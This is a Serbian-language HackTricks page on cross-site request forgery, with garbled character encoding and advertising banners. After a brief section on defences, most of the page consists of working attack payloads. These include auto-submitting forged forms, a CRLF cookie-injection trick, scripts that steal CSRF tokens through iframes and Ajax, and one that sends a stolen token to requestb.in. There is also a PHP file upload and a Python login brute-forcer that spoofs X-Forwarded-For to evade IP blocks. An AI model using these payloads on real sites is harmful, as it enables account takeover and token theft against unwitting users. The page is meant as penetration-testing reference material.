# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u hakovanje**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije najave**\
Ostanite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Objasnjenje Cross-Site Request Forgery (CSRF)

**Cross-Site Request Forgery (CSRF)** je vrsta sigurnosne ranjivosti koja se nalazi u veb aplikacijama. OmoguÄ‡ava napadaÄima da izvrÅ¡e akcije u ime nesumnjivih korisnika iskoriÅ¡Ä‡avanjem njihovih autentifikovanih sesija. Napad se izvrÅ¡ava kada korisnik, koji je prijavljen na platformu Å¾rtve, poseti zlonamerni sajt. Taj sajt zatim pokreÄ‡e zahteve ka nalogu Å¾rtve putem metoda poput izvrÅ¡avanja JavaScript-a, slanja formi ili dohvatanja slika.

### Preduslovi za CSRF Napad

Da bi se iskoristila CSRF ranjivost, potrebno je ispuniti nekoliko uslova:

1. **Identifikacija Vredne Akcije**: NapadaÄ mora pronaÄ‡i akciju vrednu iskoriÅ¡Ä‡avanja, poput promene korisniÄke lozinke, e-poÅ¡te ili poveÄ‡anja privilegija.
2. **Upravljanje Sesijom**: KorisniÄka sesija treba da se upravlja iskljuÄivo putem kolaÄiÄ‡a ili zaglavlja HTTP Basic Authentication, jer se ostala zaglavlja ne mogu manipulisati u tu svrhu.
3. **Odsustvo Nepredvidivih Parametara**: Zahtev ne sme sadrÅ¾ati nepredvidive parametre, jer oni mogu spreÄiti napad.

### Brza Provera

MoÅ¾ete **uhvatiti zahtev u Burp-u** i proveriti CSRF zaÅ¡titu i testirati iz pretraÅ¾ivaÄa moÅ¾ete kliknuti na **Kopiraj kao fetch** i proveriti zahtev:

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### Odbrana Od CSRF-a

Mogu se primeniti razliÄite mere zaÅ¡tite od CSRF napada:

* [**KolaÄiÄ‡i sa istim sajtom (SameSite cookies)**](hacking-with-cookies/#samesite): Ova osobina spreÄava pretraÅ¾ivaÄ da Å¡alje kolaÄiÄ‡e zajedno sa zahtevima sa drugih sajtova. [ViÅ¡e o kolaÄiÄ‡ima sa istim sajtom](hacking-with-cookies/#samesite).
* [**Deljenje resursa preko razliÄitih izvora (Cross-origin resource sharing)**](cors-bypass.md): CORS politika sajta Å¾rtve moÅ¾e uticati na izvodljivost napada, posebno ako napad zahteva Äitanje odgovora sa sajta Å¾rtve. [Saznajte viÅ¡e o obilasku CORS-a](cors-bypass.md).
* **Provera Korisnika**: TraÅ¾enje korisniÄke lozinke ili reÅ¡avanje captcha-e moÅ¾e potvrditi nameru korisnika.
* **Provera Referrera ili Origin Zaglavlja**: Validacija ovih zaglavlja moÅ¾e pomoÄ‡i u osiguravanju da zahtevi dolaze iz pouzdanih izvora. MeÄ‘utim, paÅ¾ljivo oblikovanje URL-ova moÅ¾e zaobiÄ‡i loÅ¡e implementirane provere, kao Å¡to su:
* KoriÅ¡Ä‡enje `http://mal.net?orig=http://example.com` (URL se zavrÅ¡ava sa pouzdanim URL-om)
* KoriÅ¡Ä‡enje `http://example.com.mal.net` (URL poÄinje sa pouzdanim URL-om)
* **Menjanje Imena Parametara**: Menjanje imena parametara u POST ili GET zahtevima moÅ¾e pomoÄ‡i u spreÄavanju automatizovanih napada.
* **CSRF Tokeni**: UkljuÄivanje jedinstvenog CSRF tokena u svaku sesiju i zahtevanje ovog tokena u narednim zahtevima moÅ¾e znaÄajno smanjiti rizik od CSRF-a. Efikasnost tokena moÅ¾e se poboljÅ¡ati primenom CORS-a.

Razumevanje i primena ovih odbrana su kljuÄni za odrÅ¾avanje sigurnosti i integriteta veb aplikacija.

## Bypass Odbrana

### Od POST-a do GET-a

MoÅ¾da je obrazac koji Å¾elite zloupotrebiti pripremljen za slanje **POST zahteva sa CSRF tokenom**, meÄ‘utim, treba **proveriti** da li je **GET** takoÄ‘e **validan** i da li se **CSRF token i dalje validira** kada poÅ¡aljete GET zahtev.

### Nedostatak tokena

Aplikacije mogu implementirati mehanizam za **validaciju tokena** kada su prisutni. MeÄ‘utim, ranjivost se javlja ako se validacija potpuno preskoÄi kada token nije prisutan. NapadaÄi mogu iskoristiti ovo tako Å¡to Ä‡e **ukloniti parametar** koji nosi token, a ne samo njegovu vrednost. To im omoguÄ‡ava da zaobiÄ‘u proces validacije i efikasno izvrÅ¡e napad Cross-Site Request Forgery (CSRF).

### CSRF token nije vezan za korisniÄku sesiju

Aplikacije koje **ne vezuju CSRF tokene za korisniÄke sesije** predstavljaju znaÄajan **sigurnosni rizik**. Ovi sistemi proveravaju tokene protiv **globalnog fonda** umesto da osiguraju da je svaki token povezan sa inicijalnom sesijom.

Evo kako napadaÄi iskoriÅ¡Ä‡avaju ovo:

1. **Autentifikacija** koriÅ¡Ä‡enjem sopstvenog naloga.
2. **Dobijanje validnog CSRF tokena** iz globalnog fonda.
3. **KoriÅ¡Ä‡enje ovog tokena** u CSRF napadu protiv Å¾rtve.

Ova ranjivost omoguÄ‡ava napadaÄima da naprave neovlaÅ¡tene zahteve u ime Å¾rtve, iskoriÅ¡Ä‡avajuÄ‡i nedovoljno efikasan mehanizam validacije tokena aplikacije.

### Bypass Metoda

Ako zahtev koristi "**Äudnu**" **metodu**, proverite da li funkcionalnost **zamene metoda** radi. Na primer, ako se koristi **PUT** metod, moÅ¾ete pokuÅ¡ati da **koristite POST** metod i **poÅ¡aljete**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Ovo takoÄ‘e moÅ¾e raditi slanjem **\_method parametra unutar POST zahteva** ili koriÅ¡Ä‡enjem **zaglavlja**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Bypass PrilagoÄ‘enog Zaglavlja Tokena

Ako zahtev dodaje **prilagoÄ‘eno zaglavlje** sa **tokenom** u zahtev kao **metodu zaÅ¡tite od CSRF-a**, onda:

* Testirajte zahtev bez **PrilagoÄ‘enog Tokena i takoÄ‘e zaglavlja.**
* Testirajte zahtev sa taÄno **istom duÅ¾inom ali drugaÄijim tokenom**.

### CSRF token se proverava putem kolaÄiÄ‡a

Aplikacije mogu implementirati zaÅ¡titu od CSRF-a dupliranjem tokena i u kolaÄiÄ‡u i u parametru zahteva ili postavljanjem CSRF kolaÄiÄ‡a i proverom da li token poslat na backend odgovara kolaÄiÄ‡u. Aplikacija validira zahteve proverom da li token u parametru zahteva odgovara vrednosti u kolaÄiÄ‡u.

MeÄ‘utim, ovaj metod je ranjiv na CSRF napade ako veb sajt ima propuste koji omoguÄ‡avaju napadaÄu da postavi CSRF kolaÄiÄ‡ u pretraÅ¾ivaÄu Å¾rtve, kao Å¡to je CRLF ranjivost. NapadaÄ moÅ¾e iskoristiti ovo postavljanjem obmanjujuÄ‡e slike koja postavlja kolaÄiÄ‡, a zatim pokretanjem CSRF napada.

U nastavku je primer kako bi napad mogao biti struktuiran:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Imajte na umu da ako je **csrf token povezan sa sesijskim kolaÄiÄ‡em ovaj napad neÄ‡e uspeti** jer Ä‡e vam biti potrebno da postavite Å¾rtvi svoju sesiju, i time Ä‡ete napadati sami sebe.
{% endhint %}

### Promena Content-Type

Prema [**ovome**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), kako bi se **izbegli preflight** zahtevi koristeÄ‡i **POST** metod, dozvoljene vrednosti Content-Type su:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

MeÄ‘utim, imajte na umu da se **logika servera moÅ¾e razlikovati** u zavisnosti od koriÅ¡Ä‡enog Content-Type, pa biste trebali isprobati navedene vrednosti i druge poput **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Primer (sa [ovde](https://brycec.me/posts/corctf\_2021\_challenges)) slanja JSON podataka kao text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Bypassing Preflight Requests for JSON Data

Kada pokuÅ¡avate poslati JSON podatke putem POST zahteva, koriÅ¡Ä‡enje `Content-Type: application/json` u HTML formi nije direktno moguÄ‡e. SliÄno, koriÅ¡Ä‡enje `XMLHttpRequest` za slanje ovog tipa sadrÅ¾aja pokreÄ‡e preflight zahtev. Ipak, postoje strategije za potencijalno zaobilaÅ¾enje ove ograniÄenosti i proveru da li server obraÄ‘uje JSON podatke bez obzira na Content-Type:

1. **Koristite Alternativne Content Type-ove**: Koristite `Content-Type: text/plain` ili `Content-Type: application/x-www-form-urlencoded` postavljanjem `enctype="text/plain"` u formi. Ovaj pristup testira da li backend koristi podatke bez obzira na Content-Type.
2. **Izmenite Content Type**: Da biste izbegli preflight zahtev dok se osiguravate da server prepoznaje sadrÅ¾aj kao JSON, moÅ¾ete poslati podatke sa `Content-Type: text/plain; application/json`. Ovo ne pokreÄ‡e preflight zahtev, ali ih server moÅ¾e pravilno obraditi ako je konfigurisan da prihvata `application/json`.
3. **KoriÅ¡Ä‡enje SWF Flash Fajla**: Manje uobiÄajen, ali izvodljiv metod ukljuÄuje koriÅ¡Ä‡enje SWF flash fajla za zaobilaÅ¾enje ovakvih ograniÄenja. Za dublje razumevanje ove tehnike, pogledajte [ovaj post](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypass Referrer / Origin provere

**Izbegavanje Referrer zaglavlja**

Aplikacije mogu validirati 'Referer' zaglavlje samo kada je prisutno. Da bi se spreÄilo slanje ovog zaglavlja od strane pregledaÄa, moÅ¾e se koristiti sledeÄ‡a HTML meta oznaka:
```xml
<meta name="referrer" content="never">
```
Ovo osigurava da se zaglavlje 'Referer' izostavi, potencijalno zaobilazeÄ‡i provere validacije u nekim aplikacijama.

**Bajpasiranje Regexp-a**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Da biste postavili ime domena servera u URL koji Ä‡e Referrer poslati unutar parametara, moÅ¾ete uraditi sledeÄ‡e:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **Bypassovanje metode HEAD**

Prvi deo [**ovog CTF reÅ¡enja**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) objaÅ¡njava da [Oak-ov izvorni kod](https://github.com/oakserver/oak/blob/main/router.ts#L281), ruter je podeÅ¡en da **obradi HEAD zahteve kao GET zahteve** bez odgovora - uobiÄajeni trik koji nije jedinstven za Oak. Umesto specifiÄnog rukovaoca koji se bavi HEAD zahtevima, oni se jednostavno **prosleÄ‘uju GET rukovaocu, ali aplikacija jednostavno uklanja telo odgovora**.

Dakle, ako je GET zahtev ograniÄen, moÅ¾ete jednostavno **poslati HEAD zahtev koji Ä‡e biti obraÄ‘en kao GET zahtev**.

## **Primeri eksploatacije**

### **IzvlaÄenje CSRF tokena**

Ako se **CSRF token** koristi kao **odbrana**, moÅ¾ete pokuÅ¡ati da ga **izvuÄete** zloupotrebom [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ranjivosti ili [**Dangling Markup**](dangling-markup-html-scriptless-injection/) ranjivosti.

### **GET koriÅ¡Ä‡enjem HTML tagova**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Drugi HTML5 tagovi koji se mogu koristiti za automatsko slanje GET zahteva su:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Zahtev za dobijanje forme
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Zahtev za slanje forme
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Slanje zahteva POST obrasca putem iframe-a
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST zahtev**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST zahtev
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST zahtev v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Form POST zahtev iz iframe-a
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Ukradi CSRF token i poÅ¡alji POST zahtev**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Ukradi CSRF token i poÅ¡alji POST zahtev koristeÄ‡i iframe, formu i Ajax**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Ukradi CSRF token i poÅ¡alji POST zahtev koriÅ¡Ä‡enjem iframe-a i forme**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Ukradi token i poÅ¡alji ga koristeÄ‡i 2 iframe-a**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ukradi CSRF token pomoÄ‡u Ajax-a i poÅ¡alji post zahtev sa formom**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF sa Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Brute Force napad

Kod moÅ¾e biti koriÅ¡Ä‡en za Brut Force napad na formu za prijavljivanje koristeÄ‡i CSRF token (TakoÄ‘e koristi zaglavlje X-Forwarded-For kako bi pokuÅ¡ao da zaobiÄ‘e moguÄ‡e crne liste IP adresa):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Alati <a href="#alati" id="alati"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Reference

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u hakovanje**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Poslednje najave**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
